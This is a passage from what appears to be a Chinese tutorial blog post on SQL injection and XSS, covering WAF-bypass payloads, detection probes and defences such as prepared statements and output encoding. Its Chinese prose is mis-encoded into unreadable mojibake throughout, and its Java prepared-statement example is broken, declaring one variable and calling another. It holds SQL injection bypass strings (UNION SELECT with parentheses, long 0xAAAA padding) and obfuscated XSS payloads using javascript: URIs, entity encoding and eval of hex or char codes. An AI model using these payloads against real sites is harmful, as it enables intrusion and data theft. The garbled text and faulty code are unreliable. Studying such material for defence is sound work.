çš„æ—¶å€™é¡µé¢æ˜¯æ­£ç¡®çš„ï¼Œç°åœ¨å†ç›²çŒœ hash çš„ç¬¬ä¸€ä½ï¼Œå¦‚æœç¬¬ä¸€ä½ç­‰äº 0x42 ä¹Ÿå°±æ˜¯ Bï¼Œé‚£ä¹ˆstrcmpç»“æœä¸º0ï¼Œ0+123=123ï¼Œæ‰€ä»¥é¡µé¢åº”è¯¥æ˜¯æ­£ç¡®çš„ã€‚å¦åˆ™å°±è¯´æ˜ä¸æ˜¯ Bï¼Œå°±è¿™æ ·çŒœï¼Œä¸ç”¨ and å’Œ or äº†ã€‚</p><p><strong>10ã€åŠ æ‹¬å·</strong></p><p>â€‹    å¦‚?id=(1)union(select(1),mid(hash,1,32)from(users))   </p><p>â€‹    ?id=(1)union(((((((select(1),hex(hash)from(users))))))))</p><p>â€‹    ?id=(1)or(0x50=0x50)</p><p><strong>11ã€ç¼“å†²åŒºæº¢å‡ºç»•è¿‡</strong></p><p>â€‹    å¦‚id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #</p><p>â€‹    å…¶ä¸­ A è¶Šå¤šè¶Šå¥½ï¼Œä¸€èˆ¬è¦æ±‚ 1000 ä¸ªä»¥ä¸Šã€‚</p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p><strong>1ã€åŸºäºæŠ¥é”™çš„æ£€æµ‹æ–¹æ³•</strong></p><p>ä½¿ç”¨å„ç§ç¬¦å·ä»¥åŠç»„åˆï¼š â€˜  â€œ  (  %</p><p>å¦‚ç›´æ¥åœ¨URLåæ·»åŠ å•å¼•å·çœ‹æ˜¯å¦æŠ¥é”™index.php?id=1â€™</p><p><strong>2ã€åŸºäºå¸ƒå°”çš„æ£€æµ‹</strong></p><p>æœ€å¸¸ç”¨çš„å¦‚1â€™ and â€˜1â€™=â€™1å’Œ1â€™ and â€˜1â€™=â€™2 ç›¸å½“äº 1â€™ and â€˜1å’Œ1â€™ and â€˜0</p><p>å½“è¿”å›çš„ç»“æœä¸åŒæ—¶å³æœ‰æ¼æ´</p><p><strong>3ã€ç›´æ¥åœ¨URLåœ°å€åé¢åŠ -1ã€-0ã€â€™%2Bâ€™å’Œâ€™%2Bâ€™a</strong></p><p>æ·»åŠ -1ï¼šindex.php?id=123-1ï¼Œå½“å‰åè®¿é—®çš„é¡µé¢ä¸åŒæ—¶ï¼Œå³å¯ç¡®å®šå­˜åœ¨æ•°å­—å‹SQLæ³¨å…¥æ¼æ´ï¼›</p><p>æ·»åŠ -0ï¼šindex.php?id=123-0ï¼Œå½“å‰åè®¿é—®çš„é¡µé¢ç›¸åŒæ—¶ï¼Œå†åŠ ä¸Š-1ï¼Œè¿”å›é”™è¯¯é¡µé¢ï¼Œåˆ™è¡¨ç¤ºå­˜åœ¨æ•°å­—å‹SQLæ³¨å…¥æ¼æ´ï¼›</p><p>æ·»åŠ â€™%2Bâ€™å’Œâ€™%2Bâ€™aï¼šè¿™é‡Œ%2Bä¸ºâ€˜+â€™çš„URLç¼–ç ï¼Œå½“å…ˆæ·»åŠ â€™%2Bâ€™æ—¶index.php?id=123â€™%2Bâ€™è¿”å›åŒæ ·çš„é¡µé¢ï¼Œè€Œæ·»åŠ â€™%2Bâ€™aæ—¶è¿”å›é”™è¯¯ï¼Œè¿™ç§é€‚ç”¨äºSQLè¯­å¥ä¸­idå€¼è¢«ä¸€å¯¹å•å¼•å·æ‹¬èµ·æ¥çš„æƒ…å†µã€‚</p><p><strong>4ã€åˆ¤æ–­ç›²æ³¨çš„å¸¸ç”¨æ–¹æ³•</strong></p><p>1â€™ and 1=1 #  </p><p>1â€™ and 1=2 #  </p><p>åˆ¤æ–­è¿™ä¸¤ç§ä¸åŒçš„è¾“å…¥æ˜¯å¦æœ‰ä¸ä¸€æ ·çš„æ˜¾ç¤ºï¼Œå¦‚æœä¸€ä¸ªæ­£å¸¸ä¸€ä¸ªé€šç”¨çš„é”™è¯¯æç¤ºæˆ–è€…å•¥ä¹Ÿä¸æ˜¾ç¤ºï¼Œåˆ™å‡ ä¹å¯ä»¥ç¡®å®šæ˜¯å«æœ‰SQLæ³¨å…¥æ¼æ´çš„ã€‚</p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•"><a href="#å››ã€é˜²å¾¡æ–¹æ³•" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p>å…³é”®æ˜¯å¯¹æ‰€æœ‰ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥è¿‡æ»¤ã€å¯¹æ•°æ®åº“é…ç½®ä½¿ç”¨æœ€å°æƒé™åŸåˆ™ã€‚</p><p><strong>å¸¸ç”¨çš„ä¿®å¤æ–¹æ¡ˆ</strong></p><p>ï¼ˆ1ï¼‰æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ° SQL è¯­å¥ä¸­ã€‚</p><p>ï¼ˆ2ï¼‰è¿‡æ»¤å±é™©çš„ SQL è¯­å¥å…³é”®å­—ã€‚</p><p>ï¼ˆ3ï¼‰ç¡®è®¤æ¯ç§æ•°æ®çš„ç±»å‹ã€‚</p><p>ï¼ˆ4ï¼‰æ•°æ®é•¿åº¦åº”è¯¥ä¸¥æ ¼è§„å®šã€‚</p><p>ï¼ˆ5ï¼‰ç½‘ç«™æ¯ä¸ªæ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ã€‚</p><p>ï¼ˆ6ï¼‰ä¸¥æ ¼é™åˆ¶ç½‘ç«™ç”¨æˆ·çš„æ•°æ®åº“çš„æ“ä½œæƒé™ã€‚</p><p>ï¼ˆ7ï¼‰é¿å…ç½‘ç«™æ˜¾ç¤º SQL é”™è¯¯ä¿¡æ¯ã€‚</p><p>ï¼ˆ8ï¼‰åœ¨ç½‘ç«™å‘å¸ƒä¹‹å‰å»ºè®®ä½¿ç”¨ä¸€äº›ä¸“ä¸šçš„ SQL æ³¨å…¥æ£€æµ‹å·¥å…·è¿›è¡Œæ£€æµ‹ã€‚</p><p>ï¼ˆ9ï¼‰å‡çº§ web æœåŠ¡å™¨è¿è¡Œå¹³å°è½¯ä»¶è¡¥ä¸ï¼Œå»ºè®®ä½¿ç”¨ WAF é˜²æŠ¤ã€‚</p><p>å…¶å®æœ€æœ‰æ•ˆçš„é˜²å¾¡æ‰‹æ®µæ˜¯ä¸‹é¢ä¸¤ç§ï¼š</p><p><strong>1ã€é¢„ç¼–è¯‘</strong></p><p>åŸç†æ˜¯é‡‡ç”¨PreparedStatementå°†ç›¸åº”çš„SQLè¯­å¥é¢„å…ˆç¼–è¯‘å¥½ï¼Œå³SQLå¼•æ“ä¼šé¢„å…ˆè¿›è¡Œè¯­æ³•åˆ†æï¼Œäº§ç”Ÿè¯­æ³•æ ‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œä»è€Œæ— è®ºç”¨æˆ·è¾“å…¥ä»€ä¹ˆå†…å®¹å³ä½¿æ˜¯sqlå‘½ä»¤éƒ½ä¸ä¼šå½±å“è¯¥SQLè¯­å¥çš„è¯­æ³•ç»“æ„è€Œåªèƒ½å½“æˆæ˜¯å­—ç¬¦ä¸²å­—é¢å€¼å‚æ•°ã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½èƒ½é‡‡ç”¨SQLé¢„ç¼–è¯‘çš„ï¼Œå¦‚éœ€è¦è¿›è¡Œä¸€äº›å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œè¿™æ—¶ä¾¿éœ€è¦ä¸¥æ ¼æ£€æŸ¥å‚æ•°çš„æ•°æ®ç±»å‹ä»¥åŠé‡‡ç”¨ä¸€äº›å®‰å…¨å‡½æ•°æ¥å¤„ç†ã€‚</p><p>å…¶è¿‡ç¨‹å¦‚ä¸‹:</p><p>ï¼ˆ1ï¼‰å®šä¹‰é¢„ç¼–è¯‘çš„sqlè¯­å¥ï¼Œå…¶ä¸­å¾…å¡«å…¥çš„å‚æ•°ç”¨?å ä½ã€‚</p><p>ï¼ˆ2ï¼‰åˆ›å»ºé¢„ç¼–è¯‘Statementï¼Œå¹¶æŠŠsqlè¯­å¥ä¼ å…¥ã€‚æ­¤æ—¶sqlè¯­å¥å·²ä¸æ­¤preparedStatementç»‘å®šã€‚æ‰€ä»¥ç¬¬4æ­¥æ‰§è¡Œè¯­å¥æ—¶æ— éœ€å†æŠŠsqlè¯­å¥ä½œä¸ºå‚æ•°ä¼ å…¥execute()ã€‚</p><p>ï¼ˆ3ï¼‰å¡«å…¥å…·ä½“å‚æ•°ã€‚é€šè¿‡setXX(é—®å·ä¸‹æ ‡ï¼Œæ•°å€¼ï¼‰æ¥ä¸ºsqlè¯­å¥å¡«å…¥å…·ä½“æ•°æ®ã€‚é—®å·ä¸‹æ ‡ä»1å¼€å§‹ï¼ŒsetXXä¸æ•°å€¼ç±»å‹æœ‰å…³ï¼Œå­—ç¬¦ä¸²å°±æ˜¯setStringï¼ˆindexï¼Œstrï¼‰ã€‚</p><p>ï¼ˆ4ï¼‰æ‰§è¡Œé¢„å¤„ç†å¯¹è±¡ã€‚</p><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql=&quot;select id,no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">prestmt.setInt(1,id);</span><br><span class="line">prestmt.executeQuery();</span><br></pre></td></tr></table></figure><p><strong>2ã€å˜é‡ç»‘å®š</strong></p><p>æ˜¯æŒ‡åœ¨sqlè¯­å¥çš„æ¡ä»¶ä¸­ä½¿ç”¨å˜é‡è€Œä¸æ˜¯å¸¸é‡ï¼Œæ˜¯ä¸ºäº†å‡å°‘è§£æçš„ã€‚å…·ä½“çš„ç»†èŠ‚ç½‘ä¸Šå¾ˆå¤šï¼Œåé¢å†è¡¥å……ã€‚</p><h2 id="XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰"><a href="#XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰" class="headerlink" title="XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰"></a>XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-1"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-1" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>ã€€ã€€è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚</p><p>â€‹    XSSï¼Œå…¨ç§°cross-site scriptingï¼Œæ˜¯ç”¨äºæ”»å‡»Webå®¢æˆ·ç«¯è€Œä¸æ˜¯æœåŠ¡å™¨ç«¯ï¼Œå…¶æœ€å¤§çš„ç‰¹ç‚¹æ˜¯èƒ½æŠŠæ¶æ„çš„JSæˆ–HTMLä»£ç æ³¨å…¥åˆ°ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šã€‚è€ŒXSSæ¼æ´çš„å­˜åœ¨ï¼Œä¸»è¦æ˜¯ç”±äºWebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤æ‰€å¯¼è‡´çš„ï¼Œå½“æ”»å‡»è€…æŠŠæ¶æ„ä»£ç æ³¨å…¥åˆ°ç½‘é¡µæ—¶ï¼Œç”¨æˆ·åªè¦è®¿é—®è¯¥ç½‘é¡µå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ã€‚</p><p><strong>æˆå› </strong></p><p>ã€€ã€€é€ æˆXSSæ¼æ´çš„åŸå› å°±æ˜¯ï¼Œæ”»å‡»è€…çš„è¾“å…¥æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„æ§åˆ¶ï¼Œæœ€ç»ˆæ˜¾ç¤ºç»™æ¥è®¿çš„ç”¨æˆ·ï¼Œæ”»å‡»è€…é€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Java,VBScriptï¼Œ ActiveXï¼Œ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°æ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ä¸ªäººç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚</p><p><strong>ç±»å‹</strong></p><p>ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‰3ç§ã€‚</p><p>â€‹    åå°„å‹ï¼ˆéæŒä¹…ï¼‰ï¼šä¸»è¦ç”¨äºå°†æ¶æ„ä»£ç é™„åŠ åˆ°URLåœ°å€çš„å‚æ•°ä¸­ï¼Œå¸¸ç”¨äºçªƒå–å®¢æˆ·ç«¯cookieä¿¡æ¯å’Œé’“é±¼æ¬ºéª—ã€‚</p><p>â€‹    å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰ï¼šæ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°WebæœåŠ¡å™¨ä¸­å¹¶ä¿å­˜èµ·æ¥ï¼Œåªè¦å®¢æˆ·ç«¯è®¿é—®äº†ç›¸åº”çš„é¡µé¢å°±ä¼šå—åˆ°æ”»å‡»ã€‚</p><p>â€‹    DOMå‹ï¼šåˆ©ç”¨æµè§ˆå™¨çš„DOMç‰¹æ€§ï¼Œä¸æ˜¯å‘æµè§ˆå™¨å‘è¯·æ±‚è€Œæ˜¯ç›´æ¥é€šè¿‡åœ¨æœ¬åœ°æ‰§è¡Œä»è€Œä¿®æ”¹æˆ–çªƒå–æœ¬åœ°çš„ä¿¡æ¯ã€‚</p><p>â€‹    Flashå‹ï¼šåˆ©ç”¨ç½‘é¡µä¸Šflashæ–‡ä»¶çš„ç¼ºé™·æ¥æ‰§è¡Œjsè„šæœ¬ï¼Œä¸€èˆ¬æ˜¯åå°„å‹XSSã€‚<br>â€‹    mXSSå‹ï¼šåˆè¢«å«åšçªå˜XSSï¼Œä¸»è¦è¢«ç”¨äºç»•è¿‡XSSè¿‡æ»¤ã€‚ç”¨æˆ·æ‰€æä¾›çš„å¯Œæ–‡æœ¬å†…å®¹é€šè¿‡javascriptä»£ç è¿›å…¥innerHTMLå±æ€§åï¼Œä¸€äº›æ„å¤–çš„å˜åŒ–ä¼šä½¿å¾—ä¸€ä¸²çœ‹ä¼¼æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç ï¼Œæœ€ç»ˆå°†è¿›å…¥æŸä¸ªDOMèŠ‚ç‚¹çš„innerHTMLä¸­ï¼Œæµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“ä¼šå°†æœ¬æ¥æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç æ¸²æŸ“æˆå…·æœ‰æ½œåœ¨å±é™©çš„XSSæ”»å‡»ä»£ç ã€‚éšåï¼Œè¯¥æ®µæ”»å‡»ä»£ç å¯èƒ½ä¼šè¢«JSä»£ç ä¸­çš„å…¶å®ƒä¸€äº›æµç¨‹è¾“å‡ºåˆ°DOMä¸­æˆ–æ˜¯å…¶å®ƒæ–¹å¼è¢«å†æ¬¡æ¸²æŸ“ï¼Œä»è€Œå¯¼è‡´XSSçš„æ‰§è¡Œã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯</strong></p><p>â€‹    ç›´æ¥åµŒå…¥html scriptæ ‡ç­¾ä¸­</p><p>â€‹    å…ƒç´ æ ‡ç­¾äº‹ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(â€˜xssâ€™)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    å›¾ç‰‡æ ‡ç­¾ img</p><p>â€‹    æ¡†æ¶æ ‡ç­¾ iframe</p><p>â€‹    DOMå¯¹è±¡</p><p><strong>åˆ©ç”¨æ–¹å¼</strong></p><p>â€‹    çªƒå–ç”¨æˆ·cookieæ¥éæ³•ç™»å½•è®¿é—®ç›®æ ‡ç«™ç‚¹ï¼›</p><p>ã€€ã€€XSSä¸CSRFæ¼æ´ç»“åˆåˆ©ç”¨ï¼Œä½¿å—å®³è€…åœ¨ä¸çŸ¥ä¸è§‰ä¸­ç”¨ç”¨æˆ·çš„è´¦å·è¿›è¡Œè½¬è´¦ç­‰æ•æ„Ÿå±é™©æ“ä½œï¼›</p><p>â€‹    XSSè •è™«ï¼›</p><p>â€‹    æ‰§è¡Œæ¶æ„JSä»£ç å®ç°é”®ç›˜è®°å½•ï¼›</p><p>â€‹    å†…åµŒæ¶æ„HTMLä»£ç åˆ°é¡µé¢ä¸­ï¼›</p><p>â€‹    é¡µé¢æ¶æ„é‡å®šå‘ï¼›</p><p>â€‹    åˆ©ç”¨XSSè¿›è¡ŒDDOSï¼Œå‚è€ƒï¼šSOHUè§†é¢‘XSSæ¼æ´å¯¼è‡´å…¶ç”¨æˆ·æˆä¸ºDDOSè‚‰é¸¡ã€‚</p><h3 id="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-1"><a href="#äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-1" class="headerlink" title="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•"></a>äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•</h3><p><strong>åˆ©ç”¨&lt;&gt;æ ‡è®°æ³¨å…¥HTMLæˆ–JS</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(â€˜xssâ€™)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨HTMLæ ‡ç­¾å±æ€§å€¼æ‰§è¡ŒXSS</strong><br>    å¾ˆå¤šçš„HTMLæ ‡è®°ä¸­çš„å±æ€§éƒ½æ”¯æŒjavascript:[code]ä¼ªåè®®çš„å½¢å¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">â€javascript:alert(</span>'<span class="attr">xss</span>');â€&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ç©ºæ ¼å›è½¦TAB</strong><br>    ç©ºç™½ä¸ä¼šå½±å“JSè¯­å¥çš„åœ¨æ­£å¸¸æ‰§è¡Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">â€javas</span><span class="attr">cript:alert</span>('<span class="attr">xss</span>')â€ <span class="attr">width</span>=<span class="string">100</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹æ ‡ç­¾å±æ€§å€¼è¿›è¡Œè½¬ç </strong><br>    HTMLå±æ€§å€¼æœ¬èº«æ˜¯æ”¯æŒASCIIç å½¢å¼çš„</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">â€javascript:alert(</span>'<span class="attr">xss</span>')â€ <span class="attr">width</span>=<span class="string">100</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    å…¶ä¸­tçš„ASCIIç å€¼ä¸º116ï¼Œç”¨â€œ&amp;#116â€æ¥è¡¨ç¤ºï¼Œè€Œå†’å·:çš„ASCIIå€¼ä¸º58ã€‚</p><p>â€‹    å¦å¤–ï¼ŒTabç¬¦çš„ASCIIç ä¸º&amp;#9ã€æ¢è¡Œç¬¦çš„ä¸º&amp;#10ã€å›è½¦ç¬¦çš„ä¸º&amp;#13å¯ä»¥è¢«æ’å…¥åˆ°ä»£ç çš„ä»»ä½•åœ°æ–¹ä¸­å»ã€‚</p><p>â€‹    è¿˜å¯ä»¥å°†&amp;#01ã€&amp;#02ç­‰å­—ç¬¦æ’å…¥åˆ°JavaScriptçš„å¤´éƒ¨ä¸­ã€‚</p><p><strong>äº§ç”Ÿè‡ªå·±çš„äº‹ä»¶</strong></p><p>â€‹    äº‹ä»¶æ˜¯ç”¨æˆ·æˆ–æµè§ˆå™¨è‡ªèº«æ‰§è¡Œçš„æŸä¸ªåŠ¨ä½œï¼Œå¦‚Clickç­‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://10.10.10.137/alan.jpg</span> <span class="attr">onerror</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    onerroræ˜¯imgæ ‡ç­¾çš„ä¸€ä¸ªäº‹ä»¶ï¼Œåªè¦é¡µé¢å‘ç”Ÿé”™è¯¯å°±ä¼šæ¿€æ´»ç›¸åº”çš„äº‹ä»¶ã€‚</p><p>â€‹    é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å„ç§äº‹ä»¶ï¼Œå¦‚ï¼šonResumeã€onfinishã€onstopã€onReverseç­‰ç­‰ã€‚</p><p><strong>åˆ©ç”¨CSSè·¨ç«™å‰–æ</strong></p><p>â€‹    CSSæ˜¯XSSçš„å¦ä¸€ä¸ªè½½ä½“ï¼Œä»£ç é€šå¸¸æ˜¯åµŒå…¥åˆ°styleæ ‡ç­¾/å±æ€§ä¸­çš„ã€‚</p><p>â€‹    ç¼ºç‚¹æ˜¯ä¸ªæµè§ˆå™¨ä¹‹é—´ä¸èƒ½é€šç”¨ã€‚</p><p><strong>æ‰°ä¹±è¿‡æ»¤è§„åˆ™</strong></p><p><strong>è½¬æ¢å¤§å°å†™ï¼Œé¡ºåºå¯ä»¥éšæ„</strong></p><p><strong>åŒå¼•å·ä¸å•å¼•å·äº’æ¢</strong></p><p><strong>ä¸ä½¿ç”¨å¼•å·</strong></p><p><strong>æ³¨é‡Šç¬¦å·</strong></p><p><strong>å†…åµŒ</strong></p><p><strong>å­—ç¬¦ç¼–ç </strong><br>    å¯ä»¥å¯¹ä»£ç è¿›è¡Œåè¿›åˆ¶ç¼–ç ï¼ˆ&amp;#ï¼‰ï¼Œå¯ä»¥åœ¨æ¯ä¸ªåè¿›åˆ¶å­—ç¬¦åé¢åŠ ä¸Šåˆ†å·ï¼›ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨&amp;#0ã€&amp;#00ï¼›ç­‰çš„å½¢å¼ã€‚</p><p>â€‹    JSä¸­çš„eval()å‡½æ•°ï¼Œç”¨äºè®¡ç®—å­—ç¬¦ä¸²å¹¶æ‰§è¡Œå…¶ä¸­çš„JSä»£ç ã€‚å¯ä»¥ä½¿ç”¨\è¿æ¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼çš„è„šæœ¬è®©eval()å‡½æ•°æ¥æ‰§è¡Œï¼Œå¦‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(â€œ\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29â€);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    ä¹Ÿå¯ä»¥è®©å…¶æ‰§è¡Œåè¿›åˆ¶å½¢å¼çš„è„šæœ¬ï¼Œä½†éœ€è¦å’ŒString.fromCharCode()å‡½æ•°ä¸€èµ·ä½¿ç”¨ã€å®ç°å°†å­—ç¬¦è½¬ä¸ºASCIIå€¼ï¼Œå¦‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    åœ¨åˆ©ç”¨CSSä¸­ï¼Œå¯ä»¥å¯¹styleä¸­çš„å±æ€§è¿›è¡Œåå…­è¿›åˆ¶çš„ç¼–ç æ¥ç»•è¿‡ã€‚</p><p><strong>Shellcodeçš„è°ƒç”¨</strong></p><p>â€‹    ç®€å•åœ°è¯´ï¼ŒShellcodeæ˜¯æŒ‡å¯¹ä¸€ä¸ªæ¼æ´è¿›è¡Œåˆ©ç”¨çš„ä»£ç ã€‚</p><p><strong>åŠ¨æ€è°ƒç”¨è¿œç¨‹JS</strong><br>    å°†shellcodeä¿å­˜åœ¨å…¶ä»–æœåŠ¡å™¨ä¸­ï¼Œç„¶åå†ç”¨scriptæ ‡ç­¾æ¥åŠ¨æ€åŠ è½½ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡åŸºäºDOMçš„æ–¹æ³•åˆ›å»ºå’Œæ’å…¥ç»“ç‚¹ï¼ŒæŠŠä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ã€‚è¿™ä¸¤ç§æ–¹å¼åœ¨åˆ©ç”¨ä¸­éƒ½æœ‰ç›¸åº”çš„æ¼”ç¤ºã€‚</p><p><strong>ä½¿ç”¨window.location.hash</strong></p><p>â€‹    å³DOMå‹ã€‚locationæ˜¯JSç®¡ç†åœ°å€æ çš„å†…ç½®å¯¹è±¡ï¼Œlocation.hashåˆ™æ˜¯ç”¨æ¥è·å–æˆ–è®¾ç½®é¡µé¢çš„æ ‡ç­¾å€¼ã€‚ç›¸å…³çš„ç®€å•çš„åˆ©ç”¨å·²æœ‰ç¤ºä¾‹ï¼Œè‡³äºDOMå‹çš„XSSä¼šæœ‰è¿›ä¸€æ­¥çš„ç¬”è®°ã€‚</p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•-1"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•-1" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p>â€‹    å¯»æ‰¾è„šæœ¬ç¨‹åºçš„è¾“å‡ºæ˜¾ç¤ºä»£ç ï¼Œæœç´¢å…³é”®å­—ï¼Œæ˜¾ç¤ºè¾“å‡ºé‚£ä¸ªå˜é‡ï¼Œè·Ÿè¸ªå˜é‡æ˜¯å¦è¢«è¿‡æ»¤ã€‚</p><p>â€‹    å¯ä»¥å…ˆè¾“å…¥ä¸€äº›å†…å®¹ï¼Œé¡µé¢è¿”å›ä¹‹åï¼Œå¯ä»¥æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæœç´¢å†…å®¹å…³é”®å­—çœ‹çœ‹æ˜¯ä¸æ˜¯ç›´æ¥è¿”å›åœ¨é¡µé¢çš„HTMLä»£ç ä¸­ã€‚</p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•-1"><a href="#å››ã€é˜²å¾¡æ–¹æ³•-1" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p><strong>1ã€è°ƒç”¨å‡½æ•°</strong></p><p>â€‹    å¯¹äºç”¨æˆ·æäº¤çš„æ•°æ®å¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œhtmlspecialchars()å‡½æ•°å°†è¾“å‡ºçš„å†…å®¹è¿›è¡ŒHTMLçš„ç¼–ç 